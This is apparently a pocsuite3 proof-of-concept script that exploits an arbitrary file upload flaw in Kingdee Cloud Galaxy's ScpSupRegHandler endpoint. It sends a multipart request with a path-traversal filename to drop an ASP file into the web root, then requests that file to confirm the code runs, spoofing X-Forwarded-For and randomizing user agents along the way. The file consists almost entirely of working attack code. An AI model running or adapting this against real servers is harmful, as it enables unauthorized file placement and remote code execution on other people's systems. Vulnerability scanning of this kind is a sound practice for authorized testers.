#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib
from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-19'
    createDate = '2023-11-19'
    updateDate = '2023-11-19'
    references = []
    name = '金蝶云星空管理中心_ScpSupRegHandler任意文件上传'
    appPowerLink = ''
    appName = '金蝶'
    appVersion = '金蝶云星空'
    vulType = 'Other'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def check(self, filename, filedata):
        res = self._exploit(filename, filedata)
        headers = {
            'User-agent': tools.get_random_ua(),
            'X-Forwarded-For': tools.get_random_ip()
        }
        if res:
            response = requests.get(url=f"{self.url}/K3Cloud/uploadfiles/{filename}.asp", headers=headers, verify=False)
            logger.debug(f"\n\n{tools.get_req(response)}\n\n{tools.get_res(response)}")
            return response

    def _exploit(self, filename, filedata):
        headers = {
            'User-agent': tools.get_random_ua(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'multipart/form-data; boundary=fd18dd968b553715cbc5a1982526199b',
            'X-Forwarded-For': tools.get_random_ip()
        }
        data = f"""--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{filename}.asp."
Content-Type: text/plain

{filedata}
--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="FID"

2022
--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="dbId_v"

.
--fd18dd968b553715cbc5a1982526199b--
        """
        res = requests.post(url=f"{self.url}/k3cloud/SRM/ScpSupRegHandler", data=data, headers=headers, verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return res.json().get("IsSuccess") == True and res.json().get(
            "Msg") == "附件保存成功！" and res.status_code == 200

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            filename = tools.get_random_num(5)
            flag = tools.get_random_str(20)
            filedata = f'<% Response.Write("{flag}") %>'
            res = self.check(filename, filedata)
            if flag in res.text and res.status_code == 200:
                result['VerifyInfo'] = {
                    'URL': self.url,
                    '存在 金蝶云星空管理中心_ScpSupRegHandler任意文件上传': self.url,
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
